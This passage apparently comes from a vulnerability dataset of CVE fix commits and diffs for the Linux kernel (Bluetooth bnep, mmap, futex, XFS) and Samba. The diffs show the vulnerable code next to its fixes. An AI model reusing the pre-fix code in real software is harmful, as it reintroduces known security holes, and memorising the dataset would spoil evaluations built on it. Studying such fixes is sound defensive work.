\t.splice_read\t= xfs_file_splice_read,\n-\t.splice_write\t= xfs_file_splice_write,\n+\t.splice_write\t= iter_file_splice_write,\n \t.unlocked_ioctl\t= xfs_file_ioctl,\n #ifdef CONFIG_COMPAT\n \t.compat_ioctl\t= xfs_file_compat_ioctl,\ndiff --git a\/fs\/xfs\/xfs_trace.h b\/fs\/xfs\/xfs_trace.h\nindex 65d8c793a25cb..53182f97cf011 100644\n--- a\/fs\/xfs\/xfs_trace.h\n+++ b\/fs\/xfs\/xfs_trace.h\n@@ -1060,7 +1060,6 @@ DEFINE_RW_EVENT(xfs_file_read);\n DEFINE_RW_EVENT(xfs_file_buffered_write);\n DEFINE_RW_EVENT(xfs_file_direct_write);\n DEFINE_RW_EVENT(xfs_file_splice_read);\n-DEFINE_RW_EVENT(xfs_file_splice_write);\n \n DECLARE_EVENT_CLASS(xfs_page_class,\n \tTP_PROTO(struct inode *inode, struct page *page, unsigned long off,\ndiff --git a\/include\/linux\/fs.h b\/include\/linux\/fs.h\nindex a6448849dbcea..8bd8ed357c7b6 100644\n--- a\/include\/linux\/fs.h\n+++ b\/include\/linux\/fs.h\n@@ -2434,6 +2434,8 @@ extern ssize_t default_file_splice_read(struct file *, loff_t *,\n \t\tstruct pipe_inode_info *, size_t, unsigned int);\n extern ssize_t generic_file_splice_write(struct pipe_inode_info *,\n \t\tstruct file *, loff_t *, size_t, unsigned int);\n+extern ssize_t iter_file_splice_write(struct pipe_inode_info *,\n+\t\tstruct file *, loff_t *, size_t, unsigned int);\n extern ssize_t generic_splice_sendpage(struct pipe_inode_info *pipe,\n \t\tstruct file *out, loff_t *, size_t len, unsigned int flags);\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-15868","CWE_ID":"264","category":"security","commit_id":"71bb99a02b32b4cc4265118e85f6035ca72923f0","commit_message":"From 71bb99a02b32b4cc4265118e85f6035ca72923f0 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Fri, 19 Dec 2014 06:20:59 +0000\nSubject: Bluetooth: bnep: bnep_add_connection() should verify that it's\n dealing with l2cap socket\n\nsame story as cmtp\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>\n---\n net\/bluetooth\/bnep\/core.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/net\/bluetooth\/bnep\/core.c b\/net\/bluetooth\/bnep\/core.c\nindex 85bcc21e84d2..ce82722d049b 100644\n--- a\/net\/bluetooth\/bnep\/core.c\n+++ b\/net\/bluetooth\/bnep\/core.c\n@@ -533,6 +533,9 @@ int bnep_add_connection(struct bnep_connadd_req *req, struct socket *sock)\n \n \tBT_DBG(\"\");\n \n+\tif (!l2cap_is_socket(sock))\n+\t\treturn -EBADFD;\n+\n \tbaswap((void *) dst, &l2cap_pi(sock->sk)->chan->dst);\n \tbaswap((void *) src, &l2cap_pi(sock->sk)->chan->src);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"8c7b49b3ecd48923eb64ff57e07a1cdb74782970","commit_message":"From 8c7b49b3ecd48923eb64ff57e07a1cdb74782970 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 20:12:03 -0500\nSubject: fix a struct file leak in do_mmap_pgoff()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mmap.c | 18 ------------------\n mm\/util.c | 15 +++++++++++++++\n 2 files changed, 15 insertions(+), 18 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mmap.c b\/mm\/mmap.c\nindex 292ddc3cef9c..5076775a395c 100644\n--- a\/mm\/mmap.c\n+++ b\/mm\/mmap.c\n@@ -948,24 +948,6 @@ unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,\n \tif (mm->map_count > sysctl_max_map_count)\n \t\treturn -ENOMEM;\n \n-\tif (flags & MAP_HUGETLB) {\n-\t\tstruct user_struct *user = NULL;\n-\t\tif (file)\n-\t\t\treturn -EINVAL;\n-\n-\t\t\/*\n-\t\t * VM_NORESERVE is used because the reservations will be\n-\t\t * taken when vm_ops->mmap() is called\n-\t\t * A dummy user value is used because we are not locking\n-\t\t * memory so no accounting is necessary\n-\t\t *\/\n-\t\tlen = ALIGN(len, huge_page_size(&default_hstate));\n-\t\tfile = hugetlb_file_setup(HUGETLB_ANON_FILE, len, VM_NORESERVE,\n-\t\t\t\t\t\t&user, HUGETLB_ANONHUGE_INODE);\n-\t\tif (IS_ERR(file))\n-\t\t\treturn PTR_ERR(file);\n-\t}\n-\n \t\/* Obtain the address to map to. we verify (or select) it and ensure\n \t * that it represents a valid section of the address space.\n \t *\/\ndiff --git a\/mm\/util.c b\/mm\/util.c\nindex 3bf81b294ae8..b377ce430803 100644\n--- a\/mm\/util.c\n+++ b\/mm\/util.c\n@@ -280,9 +280,24 @@ SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,\n \tunsigned long retval = -EBADF;\n \n \tif (!(flags & MAP_ANONYMOUS)) {\n+\t\tif (unlikely(flags & MAP_HUGETLB))\n+\t\t\treturn -EINVAL;\n \t\tfile = fget(fd);\n \t\tif (!file)\n \t\t\tgoto out;\n+\t} else if (flags & MAP_HUGETLB) {\n+\t\tstruct user_struct *user = NULL;\n+\t\t\/*\n+\t\t * VM_NORESERVE is used because the reservations will be\n+\t\t * taken when vm_ops->mmap() is called\n+\t\t * A dummy user value is used because we are not locking\n+\t\t * memory so no accounting is necessary\n+\t\t *\/\n+\t\tlen = ALIGN(len, huge_page_size(&default_hstate));\n+\t\tfile = hugetlb_file_setup(HUGETLB_ANON_FILE, len, VM_NORESERVE,\n+\t\t\t\t\t\t&user, HUGETLB_ANONHUGE_INODE);\n+\t\tif (IS_ERR(file))\n+\t\t\treturn PTR_ERR(file);\n \t}\n \n \tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-8467","CWE_ID":"264","category":"security","commit_id":"b000da128b5fb519d2d3f2e7fd20e4a25b7dae7d","commit_message":"From b000da128b5fb519d2d3f2e7fd20e4a25b7dae7d Mon Sep 17 00:00:00 2001\nFrom: Andrew Bartlett <abartlet@samba.org>\nDate: Wed, 18 Nov 2015 17:36:21 +1300\nSubject: [PATCH] CVE-2015-8467: samdb: Match MS15-096 behaviour for\n userAccountControl\n\nSwapping between account types is now restricted\n\nBug: https:\/\/bugzilla.samba.org\/show_bug.cgi?id=11552\n\nSigned-off-by: Andrew Bartlett <abartlet@samba.org>\nReviewed-by: Jeremy Allison <jra@samba.org>\nReviewed-by: Ralph Boehme <slow@samba.org>\n---\n source4\/dsdb\/samdb\/ldb_modules\/samldb.c       | 24 ++++++-\n ...\/dsdb\/tests\/python\/user_account_control.py | 63 ++++++++++++++++---\n 2 files changed, 76 insertions(+), 11 deletions(-)\n\n","diff_code":"diff --git a\/source4\/dsdb\/samdb\/ldb_modules\/samldb.c b\/source4\/dsdb\/samdb\/ldb_modules\/samldb.c\nindex e3a7db27aa9..df285d91485 100644\n--- a\/source4\/dsdb\/samdb\/ldb_modules\/samldb.c\n+++ b\/source4\/dsdb\/samdb\/ldb_modules\/samldb.c\n@@ -1558,12 +1558,15 @@ static int samldb_check_user_account_control_acl(struct samldb_ctx *ac,\n \tstruct security_token *user_token;\n \tstruct security_descriptor *domain_sd;\n \tstruct ldb_dn *domain_dn = ldb_get_default_basedn(ldb_module_get_ctx(ac->module));\n+\tstruct ldb_context *ldb = ldb_module_get_ctx(ac->module);\n \tconst struct uac_to_guid {\n \t\tuint32_t uac;\n+\t\tuint32_t priv_to_change_from;\n \t\tconst char *oid;\n \t\tconst char *guid;\n \t\tenum sec_privilege privilege;\n \t\tbool delete_is_privileged;\n+\t\tbool admin_required;\n \t\tconst char *error_string;\n \t} map[] = {\n \t\t{\n@@ -1591,6 +1594,16 @@ static int samldb_check_user_account_control_acl(struct samldb_ctx *ac,\n \t\t\t.guid = GUID_DRS_DS_INSTALL_REPLICA,\n \t\t\t.error_string = \"Adding the UF_PARTIAL_SECRETS_ACCOUNT bit in userAccountControl requires the DS-Install-Replica right that was not given on the Domain object\"\n \t\t},\n+\t\t{\n+\t\t\t.uac = UF_WORKSTATION_TRUST_ACCOUNT,\n+\t\t\t.priv_to_change_from = UF_NORMAL_ACCOUNT,\n+\t\t\t.error_string = \"Swapping UF_NORMAL_ACCOUNT to UF_WORKSTATION_TRUST_ACCOUNT requires the user to be a member of the domain admins group\"\n+\t\t},\n+\t\t{\n+\t\t\t.uac = UF_NORMAL_ACCOUNT,\n+\t\t\t.priv_to_change_from = UF_WORKSTATION_TRUST_ACCOUNT,\n+\t\t\t.error_string = \"Swapping UF_WORKSTATION_TRUST_ACCOUNT to UF_NORMAL_ACCOUNT requires the user to be a member of the domain admins group\"\n+\t\t},\n \t\t{\n \t\t\t.uac = UF_INTERDOMAIN_TRUST_ACCOUNT,\n \t\t\t.oid = DSDB_CONTROL_PERMIT_INTERDOMAIN_TRUST_UAC_OID,\n@@ -1643,7 +1656,7 @@ static int samldb_check_user_account_control_acl(struct samldb_ctx *ac,\n \t\treturn ldb_module_operr(ac->module);\n \t}\n \n-\tret = dsdb_get_sd_from_ldb_message(ldb_module_get_ctx(ac->module),\n+\tret = dsdb_get_sd_from_ldb_message(ldb,\n \t\t\t\t\t   ac, res->msgs[0], &domain_sd);\n \n \tif (ret != LDB_SUCCESS) {\n@@ -1670,12 +1683,19 @@ static int samldb_check_user_account_control_acl(struct samldb_ctx *ac,\n \t\t\t\tif (have_priv == false) {\n \t\t\t\t\tret = LDB_ERR_INSUFFICIENT_ACCESS_RIGHTS;\n \t\t\t\t}\n-\t\t\t} else {\n+\t\t\t} else if (map[i].priv_to_change_from & user_account_control_old) {\n+\t\t\t\tbool is_admin = security_token_has_builtin_administrators(user_token);\n+\t\t\t\tif (is_admin == false) {\n+\t\t\t\t\tret = LDB_ERR_INSUFFICIENT_ACCESS_RIGHTS;\n+\t\t\t\t}\n+\t\t\t} else if (map[i].guid) {\n \t\t\t\tret = acl_check_extended_right(ac, domain_sd,\n \t\t\t\t\t\t\t       user_token,\n \t\t\t\t\t\t\t       map[i].guid,\n \t\t\t\t\t\t\t       SEC_ADS_CONTROL_ACCESS,\n \t\t\t\t\t\t\t       sid);\n+\t\t\t} else {\n+\t\t\t\tret = LDB_SUCCESS;\n \t\t\t}\n \t\t\tif (ret != LDB_SUCCESS) {\n \t\t\t\tbreak;\ndiff --git a\/source4\/dsdb\/tests\/python\/user_account_control.py b\/source4\/dsdb\/tests\/python\/user_account_control.py\nindex 16c7f81d477..a53c4f93c5d 100644\n--- a\/source4\/dsdb\/tests\/python\/user_account_control.py\n+++ b\/source4\/dsdb\/tests\/python\/user_account_control.py\n@@ -240,6 +240,16 @@ class UserAccountControlTests(samba.tests.TestCase):\n         m.dn = res[0].dn\n         m[\"userAccountControl\"] = ldb.MessageElement(str(samba.dsdb.UF_WORKSTATION_TRUST_ACCOUNT),\n                                                      ldb.FLAG_MOD_REPLACE, \"userAccountControl\")\n+        try:\n+            self.samdb.modify(m)\n+            self.fail(\"Unexpectedly able to set userAccountControl to be an Workstation on %s\" % m.dn)\n+        except LdbError, (enum, estr):\n+            self.assertEqual(ldb.ERR_INSUFFICIENT_ACCESS_RIGHTS, enum)\n+\n+        m = ldb.Message()\n+        m.dn = res[0].dn\n+        m[\"userAccountControl\"] = ldb.MessageElement(str(samba.dsdb.UF_NORMAL_ACCOUNT),\n+                                                     ldb.FLAG_MOD_REPLACE, \"userAccountControl\")\n         self.samdb.modify(m)\n \n         m = ldb.Message()\n@@ -306,7 +316,12 @@ class UserAccountControlTests(samba.tests.TestCase):\n         m.dn = res[0].dn\n         m[\"userAccountControl\"] = ldb.MessageElement(str(samba.dsdb.UF_WORKSTATION_TRUST_ACCOUNT),\n                                                      ldb.FLAG_MOD_REPLACE, \"userAccountControl\")\n-        self.samdb.modify(m)\n+        try:\n+            self.samdb.modify(m)\n+            self.fail(\"Unexpectedly able to set userAccountControl to be an Workstation on %s\" % m.dn)\n+        except LdbError, (enum, estr):\n+            self.assertEqual(ldb.ERR_INSUFFICIENT_ACCESS_RIGHTS, enum)\n+\n \n     def test_admin_mod_uac(self):\n         computername=self.computernames[0]\n@@ -382,9 +397,10 @@ class UserAccountControlTests(samba.tests.TestCase):\n         priv_to_auth_users_bits = set([UF_PASSWD_NOTREQD, UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED,\n                                        UF_DONT_EXPIRE_PASSWD])\n \n-        # These bits really are privileged\n+        # These bits really are privileged, or can't be changed from UF_NORMAL as a non-admin\n         priv_bits = set([UF_INTERDOMAIN_TRUST_ACCOUNT, UF_SERVER_TRUST_ACCOUNT,\n-                         UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION])\n+                         UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,\n+                         UF_WORKSTATION_TRUST_ACCOUNT])\n \n         invalid_bits = set([UF_TEMP_DUPLICATE_ACCOUNT, UF_PARTIAL_SECRETS_ACCOUNT])\n \n@@ -446,7 +462,7 @@ class UserAccountControlTests(samba.tests.TestCase):\n                             int(\"0x10000000\", 16), int(\"0x20000000\", 16), int(\"0x40000000\", 16), int(\"0x80000000\", 16)])\n         super_priv_bits = set([UF_INTERDOMAIN_TRUST_ACCOUNT])\n \n-        priv_to_remove_bits = set([UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION])\n+        priv_to_remove_bits = set([UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, UF_WORKSTATION_TRUST_ACCOUNT])\n \n         for bit in bits:\n             # Reset this to the initial position, just to be sure\n@@ -507,6 +523,31 @@ class UserAccountControlTests(samba.tests.TestCase):\n             except LdbError, (enum, estr):\n                 self.fail(\"Unable to set userAccountControl bit 0x%08X on %s: %s\" % (bit, m.dn, estr))\n \n+            res = self.admin_samdb.search(\"%s\" % self.base_dn,\n+                                          expression=\"(&(objectClass=computer)(samAccountName=%s$))\" % computername,\n+                                          scope=SCOPE_SUBTREE,\n+                                          attrs=[\"userAccountControl\"])\n+\n+            if bit in account_types:\n+                self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n+                                 bit|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n+                                 \"bit 0X%08x should have been added (0X%08x vs 0X%08x)\"\n+                                 % (bit, int(res[0][\"userAccountControl\"][0]),\n+                                    bit|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD))\n+            elif bit in ignored_bits:\n+                self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n+                                 UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n+                                 \"bit 0X%08x should have been added (0X%08x vs 0X%08x)\"\n+                                 % (bit, int(res[0][\"userAccountControl\"][0]),\n+                                    UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD))\n+\n+            else:\n+                self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n+                                 bit|UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n+                                 \"bit 0X%08x should have been added (0X%08x vs 0X%08x)\"\n+                                 % (bit, int(res[0][\"userAccountControl\"][0]),\n+                                    bit|UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD))\n+\n             try:\n                 m = ldb.Message()\n                 m.dn = res[0].dn\n@@ -520,7 +561,7 @@ class UserAccountControlTests(samba.tests.TestCase):\n                 if bit in priv_to_remove_bits:\n                     self.assertEqual(enum, ldb.ERR_INSUFFICIENT_ACCESS_RIGHTS)\n                 else:\n-                    self.fail(\"Unexpectedly able to remove userAccountControl bit 0x%08X on %s: %s\" % (bit, m.dn, estr))\n+                    self.fail(\"Unexpectedly unable to remove userAccountControl bit 0x%08X on %s: %s\" % (bit, m.dn, estr))\n \n             res = self.admin_samdb.search(\"%s\" % self.base_dn,\n                                           expression=\"(&(objectClass=computer)(samAccountName=%s$))\" % computername,\n@@ -528,9 +569,14 @@ class UserAccountControlTests(samba.tests.TestCase):\n                                           attrs=[\"userAccountControl\"])\n \n             if bit in priv_to_remove_bits:\n-                self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n-                                 bit|UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n-                                 \"bit 0X%08x should not have been removed\" % bit)\n+                if bit in account_types:\n+                    self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n+                                     bit|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n+                                     \"bit 0X%08x should not have been removed\" % bit)\n+                else:\n+                    self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n+                                     bit|UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n+                                     \"bit 0X%08x should not have been removed\" % bit)\n             else:\n                 self.assertEqual(int(res[0][\"userAccountControl\"][0]),\n                                  UF_NORMAL_ACCOUNT|UF_ACCOUNTDISABLE|UF_PASSWD_NOTREQD,\n@@ -553,7 +599,6 @@ class UserAccountControlTests(samba.tests.TestCase):\n         self.sd_utils.dacl_add_ace(\"OU=test_computer_ou1,\" + self.base_dn, mod)\n \n         invalid_bits = set([UF_TEMP_DUPLICATE_ACCOUNT, UF_PARTIAL_SECRETS_ACCOUNT])\n-\n         # These bits are privileged, but authenticated users have that CAR by default, so this is a pain to test\n         priv_to_auth_users_bits = set([UF_PASSWD_NOTREQD, UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED,\n                                        UF_DONT_EXPIRE_PASSWD])\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3153","CWE_ID":"264","category":"security","commit_id":"54a217887a7b658e2650c3feff22756ab80c7339","commit_message":"From 54a217887a7b658e2650c3feff22756ab80c7339 Mon Sep 17 00:00:00 2001\nFrom: Thomas Gleixner <tglx@linutronix.de>\nDate: Tue, 3 Jun 2014 12:27:08 +0000\nSubject: futex: Make lookup_pi_state more robust\n\nThe current implementation of lookup_pi_state has ambigous handling of\nthe TID value 0 in the user space futex.  We can get into the kernel\neven if the TID value is 0, because either there is a stale waiters bit\nor the owner died bit is set or we are called from the requeue_pi path\nor from user space just for fun.\n\nThe current code avoids an explicit sanity check for pid = 0 in case\nthat kernel internal state (waiters) are found for the user space\naddress.  This can lead to state leakage and worse under some\ncircumstances.\n\nHandle the cases explicit:\n\n       Waiter | pi_state | pi->owner | uTID      | uODIED | ?\n\n  [1]  NULL   | ---      | ---       | 0         | 0\/1    | Valid\n  [2]  NULL   | ---      | ---       | >0        | 0\/1    | Valid\n\n  [3]  Found  | NULL     | --        | Any       | 0\/1    | Invalid\n\n  [4]  Found  | Found    | NULL      | 0         | 1      | Valid\n  [5]  Found  | Found    | NULL      | >0        | 1      | Invalid\n\n  [6]  Found  | Found    | task      | 0         | 1      | Valid\n\n  [7]  Found  | Found    | NULL      | Any       | 0      | Invalid\n\n  [8]  Found  | Found    | task      | ==taskTID | 0\/1    | Valid\n  [9]  Found  | Found    | task      | 0         | 0      | Invalid\n  [10] Found  | Found    | task      | !=taskTID | 0\/1    | Invalid\n\n [1] Indicates that the kernel can acquire the futex atomically. We\n     came came here due to a stale FUTEX_WAITERS\/FUTEX_OWNER_DIED bit.\n\n [2] Valid, if TID does not belong to a kernel thread. If no matching\n     thread is found then it indicates that the owner TID has died.\n\n [3] Invalid. The waiter is queued on a non PI futex\n\n [4] Valid state after exit_robust_list(), which sets the user space\n     value to FUTEX_WAITERS | FUTEX_OWNER_DIED.\n\n [5] The user space value got manipulated between exit_robust_list()\n     and exit_pi_state_list()\n\n [6] Valid state after exit_pi_state_list() which sets the new owner in\n     the pi_state but cannot access the user space value.\n\n [7] pi_state->owner can only be NULL when the OWNER_DIED bit is set.\n\n [8] Owner and user space value match\n\n [9] There is no transient state which sets the user space TID to 0\n     except exit_robust_list(), but this is indicated by the\n     FUTEX_OWNER_DIED bit. See [4]\n\n[10] There is no transient state which leaves owner and user space\n     TID out of sync.\n\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: Kees Cook <keescook@chromium.org>\nCc: Will Drewry <wad@chromium.org>\nCc: Darren Hart <dvhart@linux.intel.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/futex.c | 134 +++++++++++++++++++++++++++++++++++++++++++++------------\n 1 file changed, 106 insertions(+), 28 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/futex.c b\/kernel\/futex.c\nindex e1cb1baa23fb..de938d20df19 100644\n--- a\/kernel\/futex.c\n+++ b\/kernel\/futex.c\n@@ -743,10 +743,58 @@ void exit_pi_state_list(struct task_struct *curr)\n \traw_spin_unlock_irq(&curr->pi_lock);\n }\n \n+\/*\n+ * We need to check the following states:\n+ *\n+ *      Waiter | pi_state | pi->owner | uTID      | uODIED | ?\n+ *\n+ * [1]  NULL   | ---      | ---       | 0         | 0\/1    | Valid\n+ * [2]  NULL   | ---      | ---       | >0        | 0\/1    | Valid\n+ *\n+ * [3]  Found  | NULL     | --        | Any       | 0\/1    | Invalid\n+ *\n+ * [4]  Found  | Found    | NULL      | 0         | 1      | Valid\n+ * [5]  Found  | Found    | NULL      | >0        | 1      | Invalid\n+ *\n+ * [6]  Found  | Found    | task      | 0         | 1      | Valid\n+ *\n+ * [7]  Found  | Found    | NULL      | Any       | 0      | Invalid\n+ *\n+ * [8]  Found  | Found    | task      | ==taskTID | 0\/1    | Valid\n+ * [9]  Found  | Found    | task      | 0         | 0      | Invalid\n+ * [10] Found  | Found    | task      | !=taskTID | 0\/1    | Invalid\n+ *\n+ * [1]\tIndicates that the kernel can acquire the futex atomically. We\n+ *\tcame came here due to a stale FUTEX_WAITERS\/FUTEX_OWNER_DIED bit.\n+ *\n+ * [2]\tValid, if TID does not belong to a kernel thread. If no matching\n+ *      thread is found then it indicates that the owner TID has died.\n+ *\n+ * [3]\tInvalid. The waiter is queued on a non PI futex\n+ *\n+ * [4]\tValid state after exit_robust_list(), which sets the user space\n+ *\tvalue to FUTEX_WAITERS | FUTEX_OWNER_DIED.\n+ *\n+ * [5]\tThe user space value got manipulated between exit_robust_list()\n+ *\tand exit_pi_state_list()\n+ *\n+ * [6]\tValid state after exit_pi_state_list() which sets the new owner in\n+ *\tthe pi_state but cannot access the user space value.\n+ *\n+ * [7]\tpi_state->owner can only be NULL when the OWNER_DIED bit is set.\n+ *\n+ * [8]\tOwner and user space value match\n+ *\n+ * [9]\tThere is no transient state which sets the user space TID to 0\n+ *\texcept exit_robust_list(), but this is indicated by the\n+ *\tFUTEX_OWNER_DIED bit. See [4]\n+ *\n+ * [10] There is no transient state which leaves owner and user space\n+ *\tTID out of sync.\n+ *\/\n static int\n lookup_pi_state(u32 uval, struct futex_hash_bucket *hb,\n-\t\tunion futex_key *key, struct futex_pi_state **ps,\n-\t\tstruct task_struct *task)\n+\t\tunion futex_key *key, struct futex_pi_state **ps)\n {\n \tstruct futex_pi_state *pi_state = NULL;\n \tstruct futex_q *this, *next;\n@@ -756,12 +804,13 @@ lookup_pi_state(u32 uval, struct futex_hash_bucket *hb,\n \tplist_for_each_entry_safe(this, next, &hb->chain, list) {\n \t\tif (match_futex(&this->key, key)) {\n \t\t\t\/*\n-\t\t\t * Another waiter already exists - bump up\n-\t\t\t * the refcount and return its pi_state:\n+\t\t\t * Sanity check the waiter before increasing\n+\t\t\t * the refcount and attaching to it.\n \t\t\t *\/\n \t\t\tpi_state = this->pi_state;\n \t\t\t\/*\n-\t\t\t * Userspace might have messed up non-PI and PI futexes\n+\t\t\t * Userspace might have messed up non-PI and\n+\t\t\t * PI futexes [3]\n \t\t\t *\/\n \t\t\tif (unlikely(!pi_state))\n \t\t\t\treturn -EINVAL;\n@@ -769,44 +818,70 @@ lookup_pi_state(u32 uval, struct futex_hash_bucket *hb,\n \t\t\tWARN_ON(!atomic_read(&pi_state->refcount));\n \n \t\t\t\/*\n-\t\t\t * When pi_state->owner is NULL then the owner died\n-\t\t\t * and another waiter is on the fly. pi_state->owner\n-\t\t\t * is fixed up by the task which acquires\n-\t\t\t * pi_state->rt_mutex.\n-\t\t\t *\n-\t\t\t * We do not check for pid == 0 which can happen when\n-\t\t\t * the owner died and robust_list_exit() cleared the\n-\t\t\t * TID.\n+\t\t\t * Handle the owner died case:\n \t\t\t *\/\n-\t\t\tif (pid && pi_state->owner) {\n+\t\t\tif (uval & FUTEX_OWNER_DIED) {\n \t\t\t\t\/*\n-\t\t\t\t * Bail out if user space manipulated the\n-\t\t\t\t * futex value.\n+\t\t\t\t * exit_pi_state_list sets owner to NULL and\n+\t\t\t\t * wakes the topmost waiter. The task which\n+\t\t\t\t * acquires the pi_state->rt_mutex will fixup\n+\t\t\t\t * owner.\n \t\t\t\t *\/\n-\t\t\t\tif (pid != task_pid_vnr(pi_state->owner))\n+\t\t\t\tif (!pi_state->owner) {\n+\t\t\t\t\t\/*\n+\t\t\t\t\t * No pi state owner, but the user\n+\t\t\t\t\t * space TID is not 0. Inconsistent\n+\t\t\t\t\t * state. [5]\n+\t\t\t\t\t *\/\n+\t\t\t\t\tif (pid)\n+\t\t\t\t\t\treturn -EINVAL;\n+\t\t\t\t\t\/*\n+\t\t\t\t\t * Take a ref on the state and\n+\t\t\t\t\t * return. [4]\n+\t\t\t\t\t *\/\n+\t\t\t\t\tgoto out_state;\n+\t\t\t\t}\n+\n+\t\t\t\t\/*\n+\t\t\t\t * If TID is 0, then either the dying owner\n+\t\t\t\t * has not yet executed exit_pi_state_list()\n+\t\t\t\t * or some waiter acquired the rtmutex in the\n+\t\t\t\t * pi state, but did not yet fixup the TID in\n+\t\t\t\t * user space.\n+\t\t\t\t *\n+\t\t\t\t * Take a ref on the state and return. [6]\n+\t\t\t\t *\/\n+\t\t\t\tif (!pid)\n+\t\t\t\t\tgoto out_state;\n+\t\t\t} else {\n+\t\t\t\t\/*\n+\t\t\t\t * If the owner died bit is not set,\n+\t\t\t\t * then the pi_state must have an\n+\t\t\t\t * owner. [7]\n+\t\t\t\t *\/\n+\t\t\t\tif (!pi_state->owner)\n \t\t\t\t\treturn -EINVAL;\n \t\t\t}\n \n \t\t\t\/*\n-\t\t\t * Protect against a corrupted uval. If uval\n-\t\t\t * is 0x80000000 then pid is 0 and the waiter\n-\t\t\t * bit is set. So the deadlock check in the\n-\t\t\t * calling code has failed and we did not fall\n-\t\t\t * into the check above due to !pid.\n+\t\t\t * Bail out if user space manipulated the\n+\t\t\t * futex value. If pi state exists then the\n+\t\t\t * owner TID must be the same as the user\n+\t\t\t * space TID. [9\/10]\n \t\t\t *\/\n-\t\t\tif (task && pi_state->owner == task)\n-\t\t\t\treturn -EDEADLK;\n+\t\t\tif (pid != task_pid_vnr(pi_state->owner))\n+\t\t\t\treturn -EINVAL;\n \n+\t\tout_state:\n \t\t\tatomic_inc(&pi_state->refcount);\n \t\t\t*ps = pi_state;\n-\n \t\t\treturn 0;\n \t\t}\n \t}\n \n \t\/*\n \t * We are the first waiter - try to look up the real owner and attach\n-\t * the new pi_state to it, but bail out when TID = 0\n+\t * the new pi_state to it, but bail out when TID = 0 [1]\n \t *\/\n \tif (!pid)\n \t\treturn -ESRCH;\n@@ -839,6 +914,9 @@ lookup_pi_state(u32 uval, struct futex_hash_bucket *hb,\n \t\treturn ret;\n \t}\n \n+\t\/*\n+\t * No existing pi state. First waiter. [2]\n+\t *\/\n \tpi_state = alloc_pi_state();\n \n \t\/*\n@@ -959,7 +1037,7 @@ retry:\n \t * We dont have the lock. Look up the PI state (or create it if\n \t * we are the first waiter):\n \t *\/\n-\tret = lookup_pi_state(uval, hb, key, ps, task);\n+\tret = lookup_pi_state(uval, hb, key, ps);\n \n \tif (unlikely(ret)) {\n \t\tswitch (ret) {\n@@ -1565,7 +1643,7 @@ retry_private:\n \t\t\t * rereading and handing potential crap to\n \t\t\t * lookup_pi_state.\n \t\t\t *\/\n-\t\t\tret = lookup_pi_state(ret, hb2, &key2, &pi_state, NULL);\n+\t\t\tret = lookup_pi_state(ret, hb2, &key2, &pi_state);\n \t\t}\n \n \t\tswitch (ret) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-10901","CWE_ID":"264","category":"security","commit_id":"3444d7da1839b851eefedd372978d8a982316c36","commit_message":"From 3444d7da1839b851eefedd372978d8a982316c36 Mon Sep 17 00:00:00 2001\nFrom: Avi Kivity <avi@redhat.com>\nDate: Mon, 26 Jul 2010 18:32:38 +0300\nSubject: KVM: VMX: Fix host GDT.LIMIT corruption\n\nvmx does not restore GDT.LIMIT to the host value, instead it sets it to 64KB.\nThis means host userspace can learn a few bits of host memory.\n\nFix by reloading GDTR when we load other host state.\n\nSigned-off-by: Avi Kivity <avi@redhat.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\n---\n arch\/x86\/kvm\/vmx.c | 4 ++++\n 1 file changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/arch\/x86\/kvm\/vmx.c b\/arch\/x86\/kvm\/vmx.c\nindex 